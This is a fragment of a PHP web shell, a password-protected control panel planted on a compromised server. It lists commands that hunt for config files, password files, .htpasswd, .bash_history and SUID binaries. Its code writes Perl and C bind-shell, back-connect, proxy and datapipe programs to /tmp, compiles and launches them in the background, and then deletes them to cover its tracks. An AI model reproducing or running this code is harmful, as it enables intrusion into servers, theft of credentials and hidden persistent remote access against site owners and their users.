...
$fast_commands = "
Show open ports (ttfct) netstat -an | grep LISTEN | grep tcp
last root (ttfct) last root
last (all users) (ttfct) last all
Find all config.php in / (ttfct) find / -type f -name config.php
Find all config.php in . (ttfct) find . -type f -name config.php
Find all admin.php in / (ttfct) find / -type f -name admin.php
Find all admin.php in . (ttfct) find . -type f -name admin.php
Find all config.inc.php in / (ttfct) find / -type f -name config.inc.php
Find all config.inc.php in . (ttfct) find . -type f -name config.inc.php
Find all config.inc in / (ttfct) find / -type f -name config.inc
Find all config.inc in . (ttfct) find . -type f -name config.inc
Find all config.dat in / (ttfct) find / -type f -name config.dat
Find all config.dat in . (ttfct) find . -type f -name config.dat
Find all config* in / (ttfct) find / -type f -name config*
Find all config* in . (ttfct) find . -type f -name config*
Find all pass* in / (ttfct) find / -type f -name pass*
Find all pass* in . (ttfct) find . -type f -name pass*
Find all .bash_history in / (ttfct) find / -type f -name .bash_history
Find all .bash_history in . (ttfct) find . -type f -name .bash_history
Find all .htpasswd  in / (ttfct) find / -type f -name .htpasswd
Find all .htpasswd  in . (ttfct) find . -type f -name .htpasswd
Find all writable dirs/files in / (ttfct) find / -perm -2 -ls
Find all writable dirs/files in . (ttfct) find . -perm -2 -ls
Find all suid files in / (ttfct) find / -type f -perm -04000 -ls
Find all suid files in . (ttfct) find . -type f -perm -04000 -ls
Find all sgid files in / (ttfct) find / -type f -perm -02000 -ls
Find all sgid files in . (ttfct) find . -type f -perm -02000 -ls
Find all .fetchmailrc files in / (ttfct) find / -type f -name .fetchmailrc
Find all .fetchmailrc files in . (ttfct) find . -type f -name .fetchmailrc
OS Version? (ttfct) sysctl -a | grep version
Kernel version? (ttfct) cat /proc/version
cat syslog.conf (ttfct) cat /etc/syslog.conf
Cat - Message of the day (ttfct) cat /etc/motd
Cat hosts (ttfct) cat /etc/hosts
Distrib name (ttfct) cat /etc/issue.net
Distrib name (2) (ttfct) cat /etc/*-realise
Display all process - wide output (ttfct) ps auxw
Display all your process (ttfct) ps ux
Interfaces (ttfct) ifconfig
CPU? (ttfct) cat /proc/cpuinfo
RAM (ttfct) free -m
HDD space (ttfct) df -h
List of Attributes (ttfct) lsattr -a
Mount options (ttfct) cat /etc/fstab
Is cURL ittfctalled? (ttfct) which curl
Is wGET ittfctalled? (ttfct) which wget
Is lynx ittfctalled? (ttfct) which lynx
Is links ittfctalled? (ttfct) which links
Is fetch ittfctalled? (ttfct) which fetch
Is GET ittfctalled? (ttfct) which GET
Is perl ittfctalled? (ttfct) which perl
Where is apache (ttfct) whereis apache
Where is perl (ttfct) whereis perl
locate proftpd.conf (ttfct) locate proftpd.conf
locate httpd.conf (ttfct) locate httpd.conf
locate my.conf (ttfct) locate my.conf
locate psybnc.conf (ttfct) locate psybnc.conf
";
...
$fast_commands_win = "
OS Version (ttfct) ver
Tasklist  (ttfct) tasklist
Attributes in . (ttfct) attrib
Show open ports (ttfct) netstat -an
";
...
if(!isset($_SESSION['ttfct']) or $_SESSION['ttfct']!=$password){
die("
<center>
...
header('Content-Disposition: attachment; filename=ttfct-mysql-damp.htm');
}
...
$c=substr_count($fast_commands," (ttfct) ");
for($i=0; $i<=$c; $i++){
       $expl2=explode("\r\n",$fast_commands);
        $expl=explode(" (ttfct) ",$expl2[$i]);
        if(trim($expl[1])!=""){
...
$c=substr_count($fast_commands_win," (ttfct) ");
for($i=0; $i<=$c; $i++){
       $expl2=explode("\r\n",$fast_commands_win);
        $expl=explode(" (ttfct) ",$expl2[$i]);
        if(trim($expl[1])!=""){
...
To:<br><input name=to_f size=100 value='$d/ttfct_$ccopy_to'><br><br>
...
print "
<center><br>
<font color=red><b>P.S: After you Start, your browser may stuck! You must close it, and then run ttfctview.php again.</b><br></font>
<table border=1>
...
if(is_writable("/tmp")){
$fp=fopen("/tmp/ttfct_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl /tmp/ttfct_perl_bd.pl &");
unlink("/tmp/ttfct_perl_bd.pl");
}else{
if(is_writable(".")){
mkdir(".ttfct_bd_tmp");
$fp=fopen(".ttfct_bd_tmp/ttfct_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl .ttfct_bd_tmp/ttfct_perl_bd.pl &");
unlink(".ttfct_bd_tmp/ttfct_perl_bd.pl");
rmdir(".ttfct_bd_tmp");
}
}
$show_ps="1";
...
if(is_writable("/tmp")){
$fp=fopen("/tmp/ttfct_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl /tmp/ttfct_perl_proxy.pl $port &");
unlink("/tmp/ttfct_perl_proxy.pl");
}else{
if(is_writable(".")){
mkdir(".ttfct_proxy_tmp");
$fp=fopen(".ttfct_proxy_tmp/ttfct_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl .ttfct_proxy_tmp/ttfct_perl_proxy.pl $port &");
unlink(".ttfct_proxy_tmp/ttfct_perl_proxy.pl");
rmdir(".ttfct_proxy_tmp");
}
}
$show_ps="1";
...
if(is_writable("/tmp")){
$fp=fopen("/tmp/ttfct_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc /tmp/ttfct_c_bd.c -o /tmp/ttfct_bd");
passthru("nohup /tmp/ttfct_bd &");
unlink("/tmp/ttfct_c_bd.c");
unlink("/tmp/ttfct_bd");
}else{
if(is_writable(".")){
mkdir(".ttfct_bd_tmp");
$fp=fopen(".ttfct_bd_tmp/ttfct_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc .ttfct_bd_tmp/ttfct_c_bd.c -o .ttfct_bd_tmp/ttfct_bd");
passthru("nohup .ttfct_bd_tmp/ttfct_bd &");
unlink(".ttfct_bd_tmp/ttfct_bd");
unlink(".ttfct_bd_tmp/ttfct_c_bd.c");
rmdir(".ttfct_bd_tmp");
}
}
$show_ps="1";
...
if(is_writable("/tmp")){
if(file_exists("/tmp/ttfct_c_bc_c.c")){unlink("/tmp/ttfct_c_bc_c.c");}
if(file_exists("/tmp/ttfct_c_bc_c.c")){unlink("/tmp/ttfct_c_bc");}
$fp=fopen("/tmp/ttfct_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc /tmp/ttfct_c_bc_c.c -o /tmp/ttfct_bc_c");
passthru("nohup /tmp/ttfct_bc_c $ip &");
unlink("/tmp/ttfct_bc_c");
unlink("/tmp/ttfct_bc_c.c");
}else{
if(is_writable(".")){
mkdir(".ttfct_bc_c_tmp");
$fp=fopen(".ttfct_bc_c_tmp/ttfct_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc .ttfct_bc_c_tmp/ttfct_c_bc_c.c -o .ttfct_bc_c_tmp/ttfct_bc_c");
passthru("nohup .ttfct_bc_c_tmp/ttfct_bc_c $ip &");
unlink(".ttfct_bc_c_tmp/ttfct_bc_c.c");
unlink(".ttfct_bc_c_tmp/ttfct_bc_c");
rmdir(".ttfct_bc_c_tmp");
}
}
$show_ps="1";
...
if(is_writable("/tmp")){
$fp=fopen("/tmp/ttfct_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl /tmp/ttfct_perl_datapipe.pl &");
unlink("/tmp/ttfct_perl_datapipe.pl");
}else{
if(is_writable(".")){
mkdir(".ttfct_datapipe_tmp");
$fp=fopen(".ttfct_datapipe_tmp/ttfct_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl .ttfct_datapipe_tmp/ttfct_perl_datapipe.pl &");
unlink(".ttfct_datapipe_tmp/ttfct_perl_datapipe.pl");
rmdir(".ttfct_datapipe_tmp");
}
}
$show_ps="1";
...
<Br>
md5 online encoder/decoder (brutforce) (php) - [<a href=http://ttfct.void.ru/?q=releases&download=4>DOWNLOAD</a>]
</form>
";
@$md5=@$_POST['md5'];
